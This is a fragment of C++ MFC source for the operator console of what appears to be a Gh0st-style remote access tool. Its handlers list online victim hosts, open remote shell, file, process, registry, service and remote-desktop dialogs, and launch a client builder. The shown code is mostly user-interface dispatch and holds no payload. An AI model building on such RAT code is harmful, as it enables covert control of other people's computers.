	m_CListCtrl_Server_Online.SetItemText(i, 5, IsWebCameraExist);
	m_CListCtrl_Server_Online.SetItemText(i, 6, WebSpeed);

	m_CListCtrl_Server_Online.SetItemData(i, (ULONG_PTR)ContextObject);  //插入到隐藏区
	WindowShowMessage(TRUE, ClientAddressData + "主机上线");
}
//终端管理
VOID CServerDlg::OnServerCmdManager()
{
	POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();
	if (Pos)
	{
		BYTE	IsToken = CLIENT_CMD_MANAGER_REQUIRE;
		SendingSelectedCommand(&IsToken, sizeof(BYTE));	  
	}
	

}
LRESULT CServerDlg::OnOpenCmdManagerDialog(WPARAM wParam, LPARAM lParam)
{

	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	CCmdManagerDlg	*Dlg = new CCmdManagerDlg(this, 
		__IOCPServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_CMD_MANAGER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);
	if (ContextObject != NULL)
	{
		ContextObject->DlgID = CMD_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dlg;
	}
	return 0;
}
//进程管理
VOID CServerDlg::OnServerProcessManager()
{
	// 判断是否有选中项 - 没有选中项，直接向自己投递消息。打开文件管理器s
	POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();
	if (!Pos)
	{
		PostMessage(UM_OPEN_PROCESS_MANAGER_DIALOG, PROCESS_MANAGER::SERVER_MODE, NULL);   //没有客户端
	}
	else
	{

		BYTE	IsToken = CLIENT_PROCESS_MANAGER_REQUIRE;
		SendingSelectedCommand(&IsToken, sizeof(BYTE));

	}
}
LRESULT CServerDlg::OnOpenProcessManagerDialog(WPARAM wParam, LPARAM lParam)  //注意这个问题
{
	ULONG RunMode = (ULONG)wParam;
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	CProcessManagerDlg	*Dlg = new CProcessManagerDlg(this, __IOCPServer, ContextObject, RunMode);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_PROCESS_MANAGER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgID = PROCESS_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dlg;
	}


	return 0;
}
//窗口管理
VOID CServerDlg::OnServerWindowManager()
{
	// 判断是否有选中项 - 没有选中项，直接向自己投递消息。打开文件管理器s
	POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();
	if (!Pos)
	{
		PostMessage(UM_OPEN_WINDOW_MANAGER_DIALOG, WINDOW_MANAGER::SERVER_MODE, NULL);   //没有客户端
	}
	else
	{

		BYTE	IsToken = CLIENT_WINDOW_MANAGER_REQUIRE;
		SendingSelectedCommand(&IsToken, sizeof(BYTE));	
	}
}
LRESULT CServerDlg::OnOpenWindowManagerDialog(WPARAM wParam, LPARAM lParam)  //注意这个问题
{
	ULONG RunMode = (ULONG)wParam;
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	CWindowManagerDlg	*Dlg = new CWindowManagerDlg(this, __IOCPServer, ContextObject, RunMode);

	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_WINDOW_MANAGER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgID = WINDOW_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dlg;
	}


	return 0;
}

//远程控制
VOID CServerDlg::OnServerRemoteControll()
{

	BYTE	IsToken = CLIENT_REMOTE_CONTROLL_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
}
LRESULT CServerDlg::OnOpenRemoteControllDialog(WPARAM wParam, LPARAM lParam)
{
	ULONG RunMode = (ULONG)wParam;
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	CRemoteControllDlg	*Dlg = new CRemoteControllDlg(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_REMOTE_CONTROLL, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);
	if (ContextObject != NULL)
	{
		ContextObject->DlgID = REMOTE_CONTROLL_DIALOG;
		ContextObject->DlgHandle = Dlg;
	}
	return 0;
}
//文件管理
VOID CServerDlg::OnServerFileManager()
{
	// 判断是否有选中项 - 没有选中项，直接向自己投递消息。打开文件管理器s
	POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();
	if (!Pos)
	{
		PostMessage(UM_OPEN_FILE_MANAGER_DIALOG, FILE_MANAGER::SERVER_MODE, NULL);   //没有客户端
	}
	else
	{

		BYTE	IsToken = CLIENT_FILE_MANAGER_REQUIRE;
		SendingSelectedCommand(&IsToken, sizeof(BYTE));		 
	}
	
}
LRESULT CServerDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
	ULONG RunMode = (ULONG)wParam;
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	CFileManagerDlg	*Dlg = new CFileManagerDlg(this, __IOCPServer, ContextObject, RunMode);

	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_FILE_MANAGER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgID = FILE_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dlg;
	}
	return 0;

}

//音频管理
VOID CServerDlg::OnServerAudioManager()
{
	// 判断是否有选中项 - 没有选中项，直接向自己投递消息。打开文件管理器s
	POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();
	if (Pos)
	{

		//BYTE	IsToken = CLIENT_AUDIO_MANAGER_REQUIRE;
		//SendingSelectedCommand(&IsToken, sizeof(BYTE));		
	}

}
LRESULT CServerDlg::OnOpenAudioManagerDialog(WPARAM wParam, LPARAM lParam)
{
	return 0;
}

//视频管理
VOID CServerDlg::OnServerVideoManager()
{
	// 判断是否有选中项 - 没有选中项，直接向自己投递消息。打开文件管理器s
	POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();
	if (Pos)
	{

		//BYTE	IsToken = CLIENT_VIDEO_MANAGER_REQUIRE;
		//SendingSelectedCommand(&IsToken, sizeof(BYTE));		
	}

}
LRESULT CServerDlg::OnOpenVideoManagerDialog(WPARAM wParam, LPARAM lParam)
{
	return 0;
}


//注册表管理
VOID CServerDlg::OnServerRegisterManager()
{
	// 判断是否有选中项 - 没有选中项，直接向自己投递消息。打开文件管理器s
// 判断是否有选中项 - 没有选中项，直接向自己投递消息。打开文件管理器s
	POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();
	if (!Pos)
	{
		PostMessage(UM_OPEN_REGISTER_MANAGER_DIALOG, REGISTER_MANAGER::SERVER_MODE, NULL);   //没有客户端
	}
	else
	{

		BYTE	IsToken = CLIENT_REGISTER_MANAGER_REQUIRE;
		SendingSelectedCommand(&IsToken, sizeof(BYTE));
	}

}
LRESULT CServerDlg::OnOpenRegisterManagerDialog(WPARAM wParam, LPARAM lParam)
{
	ULONG RunMode = (ULONG)wParam;
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	CRegisterManagerDlg	*Dlg = new CRegisterManagerDlg(this, __IOCPServer, ContextObject, RunMode);

	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_REGISTER_MANAGER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgID = REGISTER_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dlg;
	}

	return 0;
}

//服务管理
VOID CServerDlg::OnServerServiceManager()
{
	// 判断是否有选中项 - 没有选中项，直接向自己投递消息。打开文件管理器s
	POSITION Pos = m_CListCtrl_Server_Online.GetFirstSelectedItemPosition();
	if (!Pos)
	{
		PostMessage(UM_OPEN_SERVICE_MANAGER_DIALOG, SERVICE_MANAGER::SERVER_MODE, NULL);   //没有客户端
	}
	else
	{

		BYTE	IsToken = CLIENT_SERVICE_MANAGER_REQUIRE;
		SendingSelectedCommand(&IsToken, sizeof(BYTE));		 
	}

}
LRESULT CServerDlg::OnOpenServiceManagerDialog(WPARAM wParam, LPARAM lParam)
{
	ULONG RunMode = (ULONG)wParam;
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	CServiceManagerDlg	*Dlg = new CServiceManagerDlg(this, __IOCPServer, ContextObject, RunMode);

	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SERVICE_MANAGER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgID = SERVICE_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dlg;
	}
	return 0;
}







//生成客户端
VOID CServerDlg::OnServerCreateClient()
{
	CCreateClientDlg Dlg;
	Dlg.DoModal();
}
void CServerDlg::OnServermainTestAddUser()
{
	// TODO: 在此添加命令处理程序代码
	int i = m_CListCtrl_Server_Online.InsertItem(m_CListCtrl_Server_Online.GetItemCount(), "张飞");
	m_CListCtrl_Server_Online.SetItemText(i, 1, "23");
	m_CListCtrl_Server_Online.SetItemText(i, 2, "车骑将军");
	m_CListCtrl_Server_Online.SetItemText(i, 3, "蜀");


}










